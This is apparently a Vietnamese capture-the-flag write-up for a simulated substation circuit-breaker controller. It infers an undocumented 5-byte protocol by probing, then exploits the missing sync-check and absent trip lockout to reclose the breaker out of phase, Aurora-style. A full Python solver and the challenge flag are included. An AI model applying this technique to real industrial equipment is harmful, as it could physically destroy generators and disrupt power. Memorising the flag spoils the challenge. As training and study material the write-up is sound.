# OT#002 — Máy cắt tại trạm biến áp

**Flag:** CTF{604dfaa5b5ec40f71a4d1b6690b6f433}  
**Service:** 169.58.126.107:6001  
**Định dạng flag:** CTF{...}

## Đề bài

> Máy cắt nối máy phát với lưới điện. Controller có thể truy cập trực tiếp qua mạng nhà máy và dùng một binary protocol tự thiết kế, khá nhỏ.
>
> Device number theo quy ước ANSI/IEEE C37.2 (52 = AC circuit breaker, 25 = synchronizing check). Byte lệnh, format response và các ngưỡng số không được công bố: cần tự khám phá bằng cách giao tiếp với endpoint.
>
> **Sync-check (thiết bị 25): KHÔNG CÓ**
>
> *Nhật ký sự cố hiện trường, tháng 3/2007, Idaho National Lab:* “Aurora Generator Test” — máy phát thử nghiệm được đóng lại vào lưới từ xa khi hai phía lệch pha. Xung mô-men đột ngột đủ mạnh để phá hủy máy phát, chỉ bằng một lệnh breaker thông thường.
>
> **Mục tiêu:** phá hủy máy phát rồi lấy flag mà controller ghi lại sự cố.

Không có source, binary hay protocol documentation, cũng không có memory-corruption bug: đây là lỗi process safety.

## Phân tích

### Tìm framing

Endpoint không phản hồi khi connect và bỏ qua text tùy ý. Gửi n byte sẽ tạo đúng floor(n / 5) byte 0xff; từ đó suy ra server đọc frame cố định **5 byte** và trả 0xff với frame không nhận diện:
 
```text
5 bytes   -> ff
10 bytes  -> ffff
16 bytes  -> ffffff
40 bytes  -> ffffffff ffffffff
```

Quét byte đầu của frame dạng [v, 0, 0, 0, 0] cho thấy chỉ có năm opcode hợp lệ, còn lại trả 0xff:

| Opcode | Ý nghĩa | Response |
|---:|---|---|
| 1 | Đọc telemetry | 11 byte |
| 2 | Không dùng / luôn 00 | 00 |
| 3 | Đóng breaker | 01 được nhận, 02 tripped, 00 đã đóng |
| 4 | Không dùng / luôn 00 | 00 |
| 5 | Mở breaker | 01 |

Bốn byte còn lại là argument 32-bit; opcode 2 và 4 bỏ qua nó và luôn trả 00. Bề mặt hữu dụng là 1, 3 và 5.

### Telemetry (op 1)

Response dài 11 byte:
 
```text
[status:1][phase_grid:f32][phase_gen:f32][state:u16]     (little-endian)
```

Hai float là góc pha theo độ, không phải điện áp. Chúng tăng theo **thời gian thực kể từ khi mở connection**, không phụ thuộc số request gửi:
 
```text
wait 0.5 s before reading -> f1 ~ 24,  f2 ~ 26
wait 1.0 s                -> f1 ~ 55,  f2 ~ 58
wait 2.0 s                -> f1 ~114,  f2 ~123
wait 3.0 s                -> f1 ~173,  f2 ~189
wait 4.0 s                -> f1 ~233,  f2 ~254
```

Kênh máy phát quay nhanh hơn kênh lưới một chút, nên **độ lệch pha tăng khoảng 7–8°/giây** và cuộn theo modulo 360:
 
```text
t=  0.2s  f1=  0.4  f2=  0.3  diff= -0.1
t=  2.5s  f1=131.9  f2=142.6  diff= 10.7
t=  6.4s  f1=  5.2  f2= 36.1  diff= 30.9
t= 12.0s  f1=348.2  f2= 47.0  diff= 58.9
t= 24.3s  f1=  0.3  f2=119.7  diff=119.4
t= 35.1s  f1=287.1  f2=102.4  diff=175.4
```

State thuộc từng connection: reconnect đặt pha về 0 và breaker về open, nên có thể chạy lại toàn bộ kịch bản trên socket mới.

### Điều khiển breaker (op 3 / op 5)

Word state gồm hai byte [closed][incident]:

| State | Ý nghĩa |
|---|---|
| 0x0000 | breaker mở, chưa có sự cố |
| 0x0001 | breaker đóng, chưa có sự cố |
| 0x0100 | breaker trip, sự cố đã latch |
| 0x0101 | breaker đóng **và sự cố đã latch** |

Đóng breaker khi hai pha khớp được chấp nhận (op3 -> 01), máy phát khóa pha với lưới; sau đó hai kênh tăng cùng tốc độ, độ lệch gần 0.

Đóng khi hai pha lệch nhiều bị protection từ chối (op3 -> 02) và breaker trip, state thành 0x0100. Sau khi trip, độ lệch vẫn khoảng 180°, nên đóng lại vẫn lệch pha.

Lỗ hổng là protection không latch vĩnh viễn. Sau ba lần đóng lại khi lệch pha bị từ chối, lần op3 thứ tư trả 01: breaker đóng trong khi máy phát còn lệch khoảng 170–180° — đúng kịch bản Aurora. State thành 0x0101 (đóng + incident), máy phát bị phá hủy.

### Lấy incident record

Sau khi sự cố được latch, op5 (open) trả record 129 byte thay vì 01:
 
```text
00 43 54 46 7b ... 7d 00 00 ... 00
   \_____________ CTF{...} ________/
```

Byte đầu là status, sau đó là flag string và padding 0.

## Lời giải

1. Kết nối và chờ tới khi |phase_gen - phase_grid| >= 172°, poll op1 (polling không làm simulation tiến nhanh hơn).
2. Gửi op3 (close) lặp lại. Ba lần đầu trả 02 (trip); lần kế tiếp trả 01, đóng breaker lệch pha và phá hủy máy phát.
3. Gửi op5 (open), parse incident record 129 byte để lấy flag.
 
```python
import re
import select
import socket
import struct
import time

HOST, PORT = "169.58.126.107", 6001


def connect():
    return socket.create_connection((HOST, PORT), timeout=5)


def tx(s, frame, quiet=0.25, maxt=2.0):
    """Send one 5-byte frame and collect the full response."""
    s.sendall(frame)
    out, t0, last = b"", time.time(), time.time()
    while time.time() - t0 < maxt:
        r, _, _ = select.select([s], [], [], 0.05)
        if r:
            d = s.recv(4096)
            if not d:
                break
            out += d
            last = time.time()
        elif time.time() - last > quiet:
            break
    return out


def read_status(s):
    r = tx(s, bytes([1, 0, 0, 0, 0]))
    assert len(r) == 11, r.hex()
    status = r[0]
    phase_grid, phase_gen = struct.unpack("<ff", r[1:9])
    state = struct.unpack("<H", r[9:11])[0]
    return status, phase_grid, phase_gen, state


def phase_diff(a, b):
    return ((b - a + 180) % 360) - 180


s = connect()

# 1) Wait for the generator to be almost anti-phase with the grid.
while True:
    status, grid, gen, state = read_status(s)
    diff = phase_diff(grid, gen)
    if abs(diff) >= 172:
        break
    time.sleep(0.35)

print(f"[*] reclosing at phase difference {diff:.1f} deg")

# 2) Reclose repeatedly: three trips, then the breaker stays closed
#    out of phase and the generator is destroyed.
for i in range(8):
    r = tx(s, bytes([3, 0, 0, 0, 0]))
    status, grid, gen, state = read_status(s)
    print(f"[*] close #{i + 1}: op3={r.hex()} state=0x{state:04x} "
          f"diff={phase_diff(grid, gen):.1f}")
    if r == b"\x01":
        break
    time.sleep(0.15)

# 3) Read the incident record.
time.sleep(0.3)
r = tx(s, bytes([5, 0, 0, 0, 0]), quiet=0.5, maxt=3.0)
m = re.search(rb"CTF\{[0-9a-fA-F]+\}", r)
print("[+] FLAG:", m.group(0).decode())
s.close()
```

## Ghi chú

* Protocol dùng frame cố định 5 byte [opcode][u32 arg]; 0xff là response cho opcode lạ. Gửi n byte rồi đếm floor(n / 5) response đủ để suy ra độ dài frame dù không có documentation.
* Pha được mô phỏng theo thời gian thực từ lúc bắt đầu connection, không phải theo số request. Poll op1 không tốn thời gian mô phỏng nên có thể canh thời điểm reclose; máy phát trượt khoảng 7–8° mỗi giây so với lưới.
* Sync-check relay (ANSI 25) được xác nhận là không có, cho phép đóng lệch pha. Protection trip ba lần đầu nhưng không lockout; lần đóng thứ tư thành công khi máy phát còn lệch khoảng 180°.
* Incident flag chỉ lộ sau khi lần đóng phá hủy xảy ra; nó nằm trong record op5 trả về (129 byte: 00 + flag + padding 0).
